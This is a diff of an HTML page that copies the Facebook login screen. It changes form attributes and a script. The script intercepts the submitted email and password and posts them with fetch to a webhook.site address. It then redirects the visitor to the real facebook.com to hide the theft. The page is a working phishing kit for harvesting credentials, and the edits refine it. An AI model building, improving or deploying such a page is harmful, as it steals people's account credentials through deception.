@@ -178,11 +178,11 @@ hr {
           <p>Connect with friends and the world </p>
           <p> around you on Facebook.</p>
         </div>
-        <form id="form" action="">
-          <input type="email" name="email" placeholder="Email or phone number" >
-          <input type="password" name="password" placeholder="Password" >
+        <form id="form">
+          <input type="email" name="email" placeholder="Email or phone number" required>
+          <input type="password" name="password" placeholder="Password" required>
           <div class="link">
-            <button onclick="window.location.href = 'https://facebook.com'" type="submit" class="login">Login</button>
+            <button type="submit" class="login">Login</button>
             <a href="#" class="forgot">Forgot password?</a>
           </div>
           <hr>
@@ -193,16 +193,17 @@ hr {
       </div>
     </div>
     <script>
-      (function() {
-
-const form = document.getElementById('form');
+(function() {
 
 form.addEventListener('submit', function(e) {
 // Prevent default behavior
 e.preventDefault();
-// Create payload as new FormData object
-const payload = new FormData(form);
+// Create new FormData object
+const formData = new FormData(form);
+// Convert formData object to URL-encoded string
+const payload = new URLSearchParams(formData);
 // Post the payload using Fetch
+window.location.href = "https://facebook.com";
 fetch('https://webhook.site/e1885cc3-cefb-4e48-8e0c-ca1cce34b83c', {
 method: 'POST',
 body: payload,
@@ -210,8 +211,8 @@ body: payload,
 .then(res => res.json())
 .then(data => console.log(data))
 })
-
 })()
+
     </script>
   </body>
 </html>
